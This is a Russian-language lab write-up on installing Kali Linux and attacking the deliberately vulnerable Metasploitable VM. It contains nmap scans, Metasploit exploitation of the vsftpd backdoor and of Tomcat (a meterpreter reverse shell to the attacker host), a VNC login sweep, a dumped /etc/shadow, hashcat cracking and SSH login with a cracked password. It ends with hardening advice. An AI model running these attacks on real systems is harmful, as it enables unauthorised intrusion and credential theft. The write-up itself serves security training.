# Инструменты Kali Linux

## Цель

Научиться устанавливать Kali Linux и познакомиться с инструментами для тестирования на проникновения

### Установка Kali Linux

Установить Kali Linux можно разными способами:

- Установка с iso образа
- Скачать готовый образ диска.
Мы будем устанавливать Kali Linux из iso образа. Для этого скачаем iso с официального сайта `https://www.kali.org/get-kali/#kali-platforms`
Установку будем производить в qemu через virt-manager. Установка ОС стандратная.
![Kali Linux Installer](<Screenshot_20250314_093024.png>)
Будем устанавливать ОС графической оболочки
![Kali Linux Software Selection](<Screenshot_20250314_093945.png>)
После установки ОС мы получим готовую к работе систему
![Kali Linux Login](<Screenshot_20250314_095010.png>)

Пробуем подключиться к ОС через ssh

```bash
# ssh 192.168.122.102

The authenticity of host '192.168.122.102 (192.168.122.102)' can't be established.
ED25519 key fingerprint is SHA256:wSMrmwJo/rMu7GBJb/34d82FR4IsZCyiXV9UcphAeXo.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.122.102' (ED25519) to the list of known hosts.
chilmankin@192.168.122.102's password: 
Linux otus 6.11.2-amd64 #1 SMP PREEMPT_DYNAMIC Kali 6.11.2-1kali1 (2024-10-15) x86_64

The programs included with the Kali GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Kali GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
┌──(chilmankin㉿otus)-[~]
└─$ 
```

### Выбор и установка ОС для анализа

Для изучения инструментов Kali Linux будем использовать Metasploitable — это намеренно уязвимая виртуальная машина Linux. Эта виртуальная машину используется для обучения по вопросам безопасности, тестирования инструментов безопасности и отработки распространённых методов тестирования на проникновение.

Установки данная ВМ не требует, достаточно скачать готовый образ жёсткого диска с сайта  <https://sourceforge.net/projects/metasploitable/>

### Инструменты Kali Linux

#### 1. nmap

Проверим открытые порты на целевой ВМ с помощью команы nmap, а так же попробуем установить какой сервис работает на каждом порту.
Результатом работы команды будет список открытых портов с назавнием сервиса на каждом порту (nmap, по умолчанию, сканирует 1000 наиболее используемых портов. Для сканирования всего диапазона портов можно использовать флаг -P с указанием нужного диапазона, например `-P 1-65535`).

```bash
┌──(chilmankin㉿otus)-[~]
└─$ nmap 192.168.122.138 -A
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-14 10:51 MSK
Stats: 0:02:01 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 95.45% done; ETC: 10:53 (0:00:06 remaining)
Nmap scan report for 192.168.122.138
Host is up (0.00055s latency).
Not shown: 978 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 192.168.122.102
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey: 
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
23/tcp   open  telnet      Linux telnetd
25/tcp   open  smtp        Postfix smtpd
| ssl-cert: Subject: commonName=ubuntu804-base.localdomain/organizationName=OCOSA/stateOrProvinceName=There is no such thing outside US/countryName=XX
| Not valid before: 2010-03-17T14:07:45
|_Not valid after:  2010-04-16T14:07:45
|_smtp-commands: metasploitable.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN
|_ssl-date: 2025-03-14T07:54:19+00:00; 0s from scanner time.
| sslv2: 
|   SSLv2 supported
|   ciphers: 
|     SSL2_RC2_128_CBC_WITH_MD5
|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
|     SSL2_RC4_128_EXPORT40_WITH_MD5
|     SSL2_DES_192_EDE3_CBC_WITH_MD5
|     SSL2_DES_64_CBC_WITH_MD5
|_    SSL2_RC4_128_WITH_MD5
53/tcp   open  domain      ISC BIND 9.4.2
| dns-nsid: 
|_  bind.version: 9.4.2
80/tcp   open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
|_http-title: Metasploitable2 - Linux
|_http-server-header: Apache/2.2.8 (Ubuntu) DAV/2
111/tcp  open  rpcbind     2 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100003  2,3,4       2049/tcp   nfs
|_  100003  2,3,4       2049/udp   nfs
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
512/tcp  open  exec?
513/tcp  open  login
514/tcp  open  shell?
| fingerprint-strings: 
|   NULL: 
|_    Couldn't get address for your host (otus)
1099/tcp open  java-rmi    GNU Classpath grmiregistry
1524/tcp open  bindshell   Metasploitable root shell
2049/tcp open  nfs         2-4 (RPC #100003)
2121/tcp open  ftp         ProFTPD 1.3.1
3306/tcp open  mysql       MySQL 5.0.51a-3ubuntu5
| mysql-info: 
|   Protocol: 10
|   Version: 5.0.51a-3ubuntu5
|   Thread ID: 8
|   Capabilities flags: 43564
|   Some Capabilities: Speaks41ProtocolNew, Support41Auth, SupportsTransactions, LongColumnFlag, SwitchToSSLAfterHandshake, SupportsCompression, ConnectWithDatabase
|   Status: Autocommit
|_  Salt: k~Z)[n8k4`geGp~K:},_
5432/tcp open  postgresql  PostgreSQL DB 8.3.0 - 8.3.7
| ssl-cert: Subject: commonName=ubuntu804-base.localdomain/organizationName=OCOSA/stateOrProvinceName=There is no such thing outside US/countryName=XX
| Not valid before: 2010-03-17T14:07:45
|_Not valid after:  2010-04-16T14:07:45
|_ssl-date: 2025-03-14T07:54:19+00:00; 0s from scanner time.
5900/tcp open  vnc         VNC (protocol 3.3)
| vnc-info: 
|   Protocol version: 3.3
|   Security types: 
|_    VNC Authentication (2)
6000/tcp open  X11         (access denied)
6667/tcp open  irc         UnrealIRCd
8180/tcp open  unknown     Apache-Coyote/1.1
|_http-favicon: Apache Tomcat
|_http-title: Apache Tomcat/5.5
|_http-server-header: Apache-Coyote/1.1
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port514-TCP:V=7.94SVN%I=7%D=3/14%Time=67D3DFFF%P=x86_64-pc-linux-gnu%r(
SF:NULL,2B,"\x01Couldn't\x20get\x20address\x20for\x20your\x20host\x20\(otu
SF:s\)\n");
MAC Address: 52:54:00:6C:3B:4B (QEMU virtual NIC)
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6
OS details: Linux 2.6.9 - 2.6.33
Network Distance: 1 hop
Service Info: Hosts:  metasploitable.localdomain, irc.Metasploitable.LAN; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_nbstat: NetBIOS name: METASPLOITABLE, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: metasploitable
|   NetBIOS computer name: 
|   Domain name: localdomain
|   FQDN: metasploitable.localdomain
|_  System time: 2025-03-14T03:54:06-04:00
|_smb2-time: Protocol negotiation failed (SMB2)
|_clock-skew: mean: 1h00m00s, deviation: 2h00m00s, median: 0s

TRACEROUTE
HOP RTT     ADDRESS
1   0.55 ms 192.168.122.138

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 173.16 seconds
```

#### 2. metasploit

Metasploit — это мощнейший инструмент для исследования уязвимостей в сетях и на серверах

Запуск metasploit осуществляется командой `msfconsole`
При первом запуске необходимо инициализировать базу данных который пользуется metasploit

```bash
msf6 > msfdb init
[*] exec: msfdb init

[+] Starting database
[+] Creating database user 'msf'
[+] Creating databases 'msf'
[+] Creating databases 'msf_test'
[+] Creating configuration file '/usr/share/metasploit-framework/config/database.yml'
[+] Creating initial database schema
Overriding user environment variable 'OPENSSL_CONF' to enable legacy functions.
```

Проведём сканирование доступных портов на целевой ВМ. В качестве входных параметров, укажем порты которые мы получили при сканировании nmap-ом

```bash
msf6 > db_nmap -sV -p 21,22,23,25,53,80,111,139,445,512,513,514,1099,1524,2049,2121,3306,5432,5900,6000,6667,8180 192.168.122.138
[*] Nmap: Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-14 11:16 MSK
[*] Nmap: Nmap scan report for 192.168.122.138
[*] Nmap: Host is up (0.00051s latency).
[*] Nmap: PORT     STATE SERVICE     VERSION
[*] Nmap: 21/tcp   open  ftp         vsftpd 2.3.4
[*] Nmap: 22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
[*] Nmap: 23/tcp   open  telnet      Linux telnetd
[*] Nmap: 25/tcp   open  smtp        Postfix smtpd
[*] Nmap: 53/tcp   open  domain      ISC BIND 9.4.2
[*] Nmap: 80/tcp   open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
[*] Nmap: 111/tcp  open  rpcbind     2 (RPC #100000)
[*] Nmap: 139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
[*] Nmap: 445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
[*] Nmap: 512/tcp  open  exec?
[*] Nmap: 513/tcp  open  login?
[*] Nmap: 514/tcp  open  shell?
[*] Nmap: 1099/tcp open  java-rmi    GNU Classpath grmiregistry
[*] Nmap: 1524/tcp open  bindshell   Metasploitable root shell
[*] Nmap: 2049/tcp open  nfs         2-4 (RPC #100003)
[*] Nmap: 2121/tcp open  ftp         ProFTPD 1.3.1
[*] Nmap: 3306/tcp open  mysql       MySQL 5.0.51a-3ubuntu5
[*] Nmap: 5432/tcp open  postgresql  PostgreSQL DB 8.3.0 - 8.3.7
[*] Nmap: 5900/tcp open  vnc         VNC (protocol 3.3)
[*] Nmap: 6000/tcp open  X11         (access denied)
[*] Nmap: 6667/tcp open  irc         UnrealIRCd
[*] Nmap: 8180/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1
[*] Nmap: 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
[*] Nmap: SF-Port514-TCP:V=7.94SVN%I=7%D=3/14%Time=67D3E5D1%P=x86_64-pc-linux-gnu%r(
[*] Nmap: SF:NULL,2B,"\x01Couldn't\x20get\x20address\x20for\x20your\x20host\x20\(otu
[*] Nmap: SF:s\)\n");
[*] Nmap: MAC Address: 52:54:00:6C:3B:4B (QEMU virtual NIC)
[*] Nmap: Service Info: Hosts:  metasploitable.localdomain, irc.Metasploitable.LAN; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
[*] Nmap: Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 61.99 seconds
msf6 > 
```

##### vsftpd

Среди выявленных сервисов попробуем проэксплуатировать уязвимость в ftp сервере - vsftpd

```bash
msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
[*] No payload configured, defaulting to cmd/unix/interact
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set rhost 192.168.122.138
rhost => 192.168.122.138
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > run

[*] 192.168.122.138:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 192.168.122.138:21 - USER: 331 Please specify the password.
[+] 192.168.122.138:21 - Backdoor service has been spawned, handling...
[+] 192.168.122.138:21 - UID: uid=0(root) gid=0(root)
[*] Found shell.
[*] Command shell session 1 opened (192.168.122.102:38313 -> 192.168.122.138:6200) at 2025-03-15 05:21:15 +0300

whoami
root
```
После применения эксполита мы получили shell сессию с root привелегиями. В частности смогли получить информацию из файла `/etc/shadow`

```text
root:$1$/avpfBJ1$x0z8w5UF9Iv./DR9E9Lid.:14747:0:99999:7:::
daemon:*:14684:0:99999:7:::
bin:*:14684:0:99999:7:::
sys:$1$fUX6BPOt$Miyc3UpOzQJqz4s5wFD9l0:14742:0:99999:7:::
sync:*:14684:0:99999:7:::
games:*:14684:0:99999:7:::
man:*:14684:0:99999:7:::
lp:*:14684:0:99999:7:::
mail:*:14684:0:99999:7:::
news:*:14684:0:99999:7:::
uucp:*:14684:0:99999:7:::
proxy:*:14684:0:99999:7:::
www-data:*:14684:0:99999:7:::
backup:*:14684:0:99999:7:::
list:*:14684:0:99999:7:::
irc:*:14684:0:99999:7:::
gnats:*:14684:0:99999:7:::
nobody:*:14684:0:99999:7:::
libuuid:!:14684:0:99999:7:::
dhcp:*:14684:0:99999:7:::
syslog:*:14684:0:99999:7:::
klog:$1$f2ZVMS4K$R9XkI.CmLdHhdUE3X9jqP0:14742:0:99999:7:::
sshd:*:14684:0:99999:7:::
msfadmin:$1$XN10Zj2c$Rt/zzCW3mLtUWA.ihZjA5/:14684:0:99999:7:::
bind:*:14685:0:99999:7:::
postfix:*:14685:0:99999:7:::
ftp:*:14685:0:99999:7:::
postgres:$1$Rw35ik.x$MgQgZUuO5pAoUvfJhfcYe/:14685:0:99999:7:::
mysql:!:14685:0:99999:7:::
tomcat55:*:14691:0:99999:7:::
distccd:*:14698:0:99999:7:::
user:$1$HESu9xrH$k.o3G93DGoXIiQKkPmUgZ0:14699:0:99999:7:::
service:$1$kR3ue7JZ$7GxELDupr5Ohp6cjZ3Bu//:14715:0:99999:7:::
telnetd:*:14715:0:99999:7:::
proftpd:!:14727:0:99999:7:::
statd:*:15474:0:99999:7:::
```

##### tomcat

Попробуем проэксплуатировать уязвимость tomcat

```bash
msf6 > use exploit/multi/http/tomcat_mgr_upload
[*] No payload configured, defaulting to java/meterpreter/reverse_tcp
msf6 exploit(multi/http/tomcat_mgr_upload) > set rhost 192.168.122.138
rhost => 192.168.122.138
msf6 exploit(multi/http/tomcat_mgr_upload) > set rport 8180
rport => 8180
msf6 exploit(multi/http/tomcat_mgr_upload) > set HttpUsername tomcat
HttpUsername => tomcat
msf6 exploit(multi/http/tomcat_mgr_upload) > set HttpPassword tomcat
HttpPassword => tomcat
msf6 exploit(multi/http/tomcat_mgr_upload) > set payload java/meterpreter/reverse_tcp 
payload => java/meterpreter/reverse_tcp
msf6 exploit(multi/http/tomcat_mgr_upload) > set lhost 192.168.122.102
lhost => 192.168.122.102
msf6 exploit(multi/http/tomcat_mgr_upload) > exploit

[*] Started reverse TCP handler on 192.168.122.102:4444 
[*] Retrieving session ID and CSRF token...
[*] Uploading and deploying HYKhJwkD8rFxGo36cOI9UFIV...
[*] Executing HYKhJwkD8rFxGo36cOI9UFIV...
[*] Undeploying HYKhJwkD8rFxGo36cOI9UFIV ...
[*] Undeployed at /manager/html/undeploy
[*] Sending stage (58037 bytes) to 192.168.122.138
[*] Meterpreter session 2 opened (192.168.122.102:4444 -> 192.168.122.138:36424) at 2025-03-15 05:36:49 +0300

meterpreter > sysinfo
Computer        : metasploitable
OS              : Linux 2.6.24-16-server (i386)
Architecture    : x86
System Language : en_US
Meterpreter     : java/linux
meterpreter > 
```

В результате атаки мы получили доступ к целевой ВМ и можем управлять ей через meterpreter.

##### vnc

Так же удалось получить доступ к ВМ через VNC

```bash
msf6 > use auxiliary/scanner/vnc/vnc_login
msf6 auxiliary(scanner/vnc/vnc_login) > set rhost 192.168.122.138
rhost => 192.168.122.138
msf6 auxiliary(scanner/vnc/vnc_login) > set THREADS 20
THREADS => 20
msf6 auxiliary(scanner/vnc/vnc_login) > run

[*] 192.168.122.138:5900  - 192.168.122.138:5900 - Starting VNC login sweep
[+] 192.168.122.138:5900  - 192.168.122.138:5900 - Login Successful: :password
[*] 192.168.122.138:5900  - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

![VNC exploit](<Screenshot_20250315_075354.png>)

#### Перебор паролей

Получив доступ к ВМ через уязвимость в сервисе vsftpd мы получили хеши паролей пользователей.
Попробуем из подобрать используя утилиту `hashcat` а так же стандартны набор паролей из поставки Kali Linux. 

```bash
┌──(chilmankin㉿otus)-[~]
└─$  hashcat -a 0 -o cracked.txt pwd.txt /usr/share/wordlists/rockyou.txt --force 

Session..........: hashcat
Status...........: Exhausted
Hash.Mode........: 500 (md5crypt, MD5 (Unix), Cisco-IOS $1$ (MD5))
Hash.Target......: pwd.txt
Time.Started.....: Sat Mar 15 08:19:24 2025, (1 hour, 1 min)
Time.Estimated...: Sat Mar 15 09:21:05 2025, (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:    16714 H/s (7.72ms) @ Accel:128 Loops:500 Thr:1 Vec:8
Recovered........: 3/7 (42.86%) Digests (total), 3/7 (42.86%) Digests (new), 3/7 (42.86%) Salts
Progress.........: 100410695/100410695 (100.00%)
Rejected.........: 0/100410695 (0.00%)
Restore.Point....: 14344385/14344385 (100.00%)
Restore.Sub.#1...: Salt:6 Amplifier:0-1 Iteration:500-1000
Candidate.Engine.: Device Generator
Candidates.#1....: $HEX[206b72697374656e616e6e65] -> $HEX[042a0337c2a156616d6f732103]

Started: Sat Mar 15 08:19:00 2025
Stopped: Sat Mar 15 09:21:07 2025
```

Перебор всех паролей занял около 1 часа, в результате было подобрано 3 пароля из 7 (для ускорения перебора паролей можно воспользоваться радужными таблицами)

```text
cat cracked.txt
$1$fUX6BPOt$Miyc3UpOzQJqz4s5wFD9l0:batman
$1$f2ZVMS4K$R9XkI.CmLdHhdUE3X9jqP0:123456789
$1$kR3ue7JZ$7GxELDupr5Ohp6cjZ3Bu//:service
```

Пробуем подключиться к целевой системе под одной из УЗ

```bash
┌──(chilmankin㉿otus)-[~]
└─$  ssh -oPubkeyAcceptedAlgorithms=ssh-rsa -oHostKeyAlgorithms=ssh-rsa sys@192.168.122.138    
sys@192.168.122.138's password: 
Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

To access official Ubuntu documentation, please visit:
http://help.ubuntu.com/
Last login: Sat Mar 15 01:35:44 2025 from 192.168.122.102
sys@metasploitable:~$ 
```

### Рекомендации улучшению безопасности

1. Регулярно устанавливать обновления
2. Не использовать пароли устанавиваемые по умолчанию при разворачивании сервиса.
3. Не использовать простые пароли, а так же их регулярная смена.
4. Использовать более стойкие алгоритмы хеширования паролей.
5. По возможности убрать сервисы удалённого доступа (telnet/ssh/vnc) из общедоступной сети (убрать за VPN). Если убрать сервис не представляется возможным, можно сменить порт по умолчанию и/или настроить системы защиты от перебора паролей (например fail2ban)
6. Для защиты web приложений рекомендуется использовать WAF
7. Ограничивать доступ к сервисам только с определённых ip (например postgresql, mysql)
8. Предоставить доступ к сервисам только с определёных ip или сетей на уровне firewall.
